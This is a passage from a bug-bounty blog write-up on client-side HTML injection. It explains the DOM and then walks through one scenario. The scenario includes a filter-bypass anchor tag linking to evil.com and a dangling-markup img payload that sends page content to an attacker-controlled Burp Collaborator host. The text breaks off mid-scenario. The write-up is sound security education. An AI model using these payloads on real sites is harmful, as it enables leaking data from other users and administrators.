---
title: Advanced Client Side Injection Secrets Leads To (SSRF , Prev Esc)
url: https://infosecwriteups.com/advanced-client-side-injection-secrets-leads-to-ssrf-prev-esc-637a3781b8cd?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2026-05-29
fetch_date: 2026-05-30T05:42:20.561110
---

# Advanced Client Side Injection Secrets Leads To (SSRF , Prev Esc)

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fadvanced-client-side-injection-secrets-leads-to-ssrf-prev-esc-637a3781b8cd&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fadvanced-client-side-injection-secrets-leads-to-ssrf-prev-esc-637a3781b8cd&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-637a3781b8cd---------------------------------------)

·

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-637a3781b8cd---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

# Advanced Client Side Injection Secrets Leads To (SSRF , Prev Esc)🤫

## Client-Side Injection(Advanced): How Small Bugs Lead To Big Bounties(SSRF , Prev Esc , KeyLogger , 30XSS)

[![Mado](https://miro.medium.com/v2/resize:fill:64:64/1*Tds8jypFvhxRJneL3x42bQ.jpeg)](https://medium.com/%400xMado-1Tap?source=post_page---byline--637a3781b8cd---------------------------------------)

[Mado](https://medium.com/%400xMado-1Tap?source=post_page---byline--637a3781b8cd---------------------------------------)

8 min read

·

1 day ago

--

2

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D637a3781b8cd&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fadvanced-client-side-injection-secrets-leads-to-ssrf-prev-esc-637a3781b8cd&source=---header_actions--637a3781b8cd---------------------post_audio_button------------------)

Share

![]()

**الحمد لله والصلاة والسلام على رسول الله وعلى آله وصحبه أما بعد**

***Hello HackerS***

### Eid Mubarak , I’m Mohamed also known as 0xMado, a dedicated Web Application Penetration Tester and bug hunter

> **NOTE: The Write Up is Technical and hunting and The Write up Focus on Client Side Injection And common Bugs From low to Critical Get Your Coffee and Lets go If You Liked The Write up Dont Forget 50 Clapped And Thank you**

Press enter or click to view image in full size

![]()

## Client-Side Injection Basics: What It Is and Why It Matters

To understand Client-Side Injection, think about how websites work in the browser The browser builds the page using objects and elements that can be modified dynamically with JavaScript

The attacker exploits this dynamic to inject malicious code (such as JavaScript or HTML) into those elements which the browser then executes automatically as part of the website

## Object-Oriented Programming (OOP)

is based on creating objects that contain different attributes and data For example, in an RPG game when a player creates a character that character will have attributes like health coins inventory and more

If I were building that game as a developer the first thing I would do is create objects to represent the character and store its data

This is similar to the idea of the Document Object Model (DOM) The DOM represents a webpage as objects, where every element on the page is treated like an object that can store data and be modified dynamically

## **DOM Document Object Model(DOM)**

**The Document Object Model** is just how were modeling the way data is handled within a web page Think about something like: JavaScript

```
document.location
```

```
           You (Browser)                          Server
              |                                     |
              |-------- HTTP Request (GET/) ------->|
              |                                     |
              |<------- HTTP Response (HTML) -------|
              |                                     |
              |                                     |
              +---v---------------------------------+
              |         Document Object (DOM)       |
              |                                     |
              |  document.location = "target.com"   |
              |  document.cookie   = "session=xyz"  |
              |  document.body     = "<html>..."    |
              |                                     |
              +-------------------------------------+
```

Your goal as the attacker, as the bug bounty researcher is simple: **Inject malicious content into that document object**

### So Where Does The Attack Come In? 🔥

We can’t directly manipulate the DOM from outside But ultimately for **Cross-Site Scripting**, **Prototype Pollution** or **any Client-Side Injection attack** Just like **Zseaon** who found one vulnerable 7000 endpoint(Archive) and walked 30XSS

Press enter or click to view image in full size

![]()

Shout out To NahamSec + Zseaon — Image From Video **NahamSec** With [**Zseaon**](https://zseano.medium.com/)

Alright so now that we understand the DOM and how it works the big question is ***Where do we actually look for Client-Side Injection?*** We’ve got 4 **strategies** lets break them down

First thing you want to do is go after the **unauthenticated routes** Look for: **1# Hidden subdomains** — **#2 Hidden applications** that haven’t been tested by other researchers #3**Hidden endpoints — #4 Hidden functionality**

Why? Because your goal is to find something **untouched** and then try to inject user-controlled input to manipulate the DOM in a way the developers never intended

## First Scenario (HTML Injection Leads To SSRF) 1️⃣

While testing for HTML Injection, I found a search bar in the target application and started injecting simple HTML tags into it such as:

```
<h1>Hacked By Mado</h1>
```

Press enter or click to view image in full size

![]()

Request

```
## But My Target its Have good filter its Delete the tag
I AM Trying other Tags For bypass it
<a href="https://evil.com" style="background:red;color:white;padding:10px;border-radius:5px;font-size:20px;text-decoration:none;margin-left:-200px;display:inline-block;"> 💀 Hacked By Mado💀</a><!--
```

Press enter or click to view image in full size

![]()

## Exploiting the HTML injection (SSRF)

```
https://Admin.Target.com?<img src=“https:// <collaborator_id>.oastify.com/?test=
```

***The first part*** `https://admin.Target.com?` ***is the administration URL It is necessary for the server to accept the request***

We then create a new image tag with its source pointing to a server we control such as `<your_ID>.oastify.com` which is generated using Burp Collaborator We also add a test parameter, but we intentionally do not close the `src` attribute or the `<img>` tag so the remaining HTML content gets appended to the image URL and sent to our server

## Get Mado’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

[x]

Remember me for faster sign in

By inject...